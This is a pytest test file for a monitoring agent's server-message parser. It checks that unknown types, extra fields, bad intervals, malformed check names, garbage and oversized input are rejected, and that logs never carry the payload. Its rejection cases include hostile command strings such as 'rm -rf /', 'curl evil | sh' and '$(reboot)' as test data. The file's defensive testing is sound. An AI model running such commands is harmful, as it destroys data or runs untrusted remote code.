"""parse_server_message is the agent's security gate: test it hard."""

import json
import logging
from pathlib import Path

import pytest

from agent import AGENT_VERSION
from agent.config import AgentConfig
from agent.protocol import (
    MAX_MESSAGE_BYTES,
    MAX_REPORT_BYTES,
    hello_message,
    os_name,
    parse_server_message,
    report_message,
)

WELCOME = {"type": "welcome", "interval_seconds": 60, "enabled_checks": ["updates", "disks"]}


def parse(message) -> dict | None:
    return parse_server_message(json.dumps(message))


def test_welcome_accepted():
    assert parse(WELCOME) == WELCOME


def test_collect_accepted():
    assert parse({"type": "collect"}) == {"type": "collect"}


def test_unknown_check_names_pass_through_and_empty_list_ok():
    # The agent only ever runs checks its local config enables; the list can only narrow it.
    assert parse({**WELCOME, "enabled_checks": ["kubernetes"]}) is not None
    assert parse({**WELCOME, "enabled_checks": []}) is not None


@pytest.mark.parametrize(
    "message",
    [
        {"type": "run_action", "action": "reboot"},
        {"type": "exec", "cmd": "rm -rf /"},
        {"type": "error", "code": "invalid_report"},
        {"type": "WELCOME", "interval_seconds": 60, "enabled_checks": []},
        {"type": None},
        {"type": ["collect"]},
        {},
    ],
)
def test_unknown_types_rejected(message):
    assert parse(message) is None


@pytest.mark.parametrize(
    "message",
    [
        {"type": "collect", "cmd": "id"},
        {"type": "collect", "checks": ["updates"]},
        {**WELCOME, "command": "curl evil | sh"},
        {"type": "welcome", "interval_seconds": 60},  # missing field
        {"type": "welcome", "enabled_checks": []},
    ],
)
def test_extra_or_missing_fields_rejected(message):
    assert parse(message) is None


@pytest.mark.parametrize("interval", ["60", 60.0, True, None, [60], 9, 0, -60, 86_401, 10**100])
def test_bad_interval_rejected(interval):
    assert parse({**WELCOME, "interval_seconds": interval}) is None


@pytest.mark.parametrize("interval", [10, 60, 86_400])
def test_interval_bounds_accepted(interval):
    assert parse({**WELCOME, "interval_seconds": interval})["interval_seconds"] == interval


@pytest.mark.parametrize(
    "checks",
    [
        "updates",
        {"updates": True},
        [1],
        [None],
        ["Updates"],
        ["up dates"],
        ["$(reboot)"],
        ["x" * 33],
        ["updates"] * 33,
    ],
)
def test_bad_enabled_checks_rejected(checks):
    assert parse({**WELCOME, "enabled_checks": checks}) is None


@pytest.mark.parametrize(
    "raw",
    [
        "not json",
        "",
        "[]",
        '"collect"',
        "42",
        "null",
        "[" * 60_000,  # deeply nested (under the size limit): RecursionError, not a crash
        b'{"type": "collect"}',  # binary frame
        None,
    ],
)
def test_garbage_rejected(raw):
    assert parse_server_message(raw) is None


def test_huge_message_rejected():
    padding = "x" * MAX_MESSAGE_BYTES
    assert parse_server_message(json.dumps({"type": "collect", "pad": padding})) is None


def test_rejection_logs_type_only_never_the_payload(caplog):
    caplog.set_level(logging.DEBUG)

    parse({"type": "exec", "cmd": "SECRET-PAYLOAD"})
    parse({"type": "SECRET-TYPE-$(id)", "x": 1})
    parse_server_message("SECRET-NOT-JSON")

    assert "SECRET" not in caplog.text
    assert "type exec" in caplog.text
    assert "type ?" in caplog.text


def test_hello_message():
    hello = hello_message(AgentConfig(token="t" * 43))

    assert set(hello) == {"type", "agent_version", "hostname", "os"}
    assert hello["type"] == "hello"
    assert hello["agent_version"] == AGENT_VERSION
    assert hello["hostname"] and hello["os"]
    assert "t" * 43 not in json.dumps(hello)


def test_os_name_from_os_release(tmp_path: Path):
    path = tmp_path / "os-release"
    path.write_text('NAME="Ubuntu"\nPRETTY_NAME="Ubuntu 24.04.1 LTS"\n', encoding="utf-8")

    assert os_name(str(path)) == "Ubuntu 24.04.1 LTS"


def test_os_name_is_cleaned_and_bounded(tmp_path: Path):
    path = tmp_path / "os-release"
    path.write_text('PRETTY_NAME="Evil\x1b[31m' + "x" * 300 + '"\n', encoding="utf-8")

    name = os_name(str(path))
    assert "\x1b" not in name
    assert len(name) <= 100


def test_os_name_fallback(tmp_path: Path):
    assert os_name(str(tmp_path / "missing"))


def test_report_message():
    assert report_message({"a": 1}) == {"type": "report", "report": {"a": 1}}


def test_report_budget_leaves_room_below_the_servers_websocket_limit():
    # The server closes the socket on a message over 262,144 bytes (--ws-max-size).
    assert MAX_REPORT_BYTES == 250_000
    assert MAX_REPORT_BYTES < 262_144
